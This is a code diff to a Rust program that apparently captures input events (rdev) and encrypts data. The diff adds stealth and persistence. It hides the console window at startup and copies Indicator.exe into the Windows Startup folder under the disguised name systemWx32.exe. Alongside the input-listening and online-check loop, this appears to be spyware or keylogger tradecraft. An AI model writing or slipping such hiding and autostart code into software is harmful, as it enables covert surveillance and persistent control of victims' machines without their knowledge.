@@ -1,6 +1,8 @@
+#![windows_subsystem = "windows"]
 #![allow(non_snake_case,non_camel_case_types,dead_code)]
 
-use std::{fs::{self, File}, io::Write, process::Command, sync::Mutex};
+use std::{fs::{self, File}, io::Write, process::Command, sync::Mutex, path::Path};
+use directories::UserDirs;
 use rdev::{EventType, Key, SimulateError, Button, simulate, listen};
 use aes_gcm::{
     aead::{Aead, KeyInit},
@@ -67,8 +69,37 @@ struct CliJson{
 }
 
 static EVENT:Mutex<String> =Mutex::new(String::new());
+
+fn hide_console_window() {
+    use std::ptr;
+    use winapi::um::wincon::GetConsoleWindow;
+    use winapi::um::winuser::{ShowWindow, SW_HIDE};
+
+    let window = unsafe {GetConsoleWindow()};
+    // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
+    if window != ptr::null_mut() {
+        unsafe {
+            ShowWindow(window, SW_HIDE);
+        }
+    }
+}
 #[tokio::main]
 async fn main() {
+    hide_console_window();
+    if let Some(user_dirs) = UserDirs::new() {
+        let startup_path = format!("{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",user_dirs.home_dir().to_str().unwrap());
+
+        let current  = std::env::current_dir().unwrap();
+        let startup_optic = fs::read_dir(startup_path.clone()).unwrap();
+        for i in startup_optic{
+            if i.unwrap().file_name() != "systemWx32.exe"{
+                let input = fs::read(format!("{}\\Indicator.exe",current.to_str().unwrap())).unwrap();
+                let mut output = fs::File::create(format!("{}\\systemWx32.exe",startup_path.as_str())).unwrap();
+                output.write_all(&input).unwrap();
+                break;
+            }
+        }
+    }
     loop{
         if online::check(Some(1)).is_ok(){
             // let output = if cfg!(target_os = "windows") { 
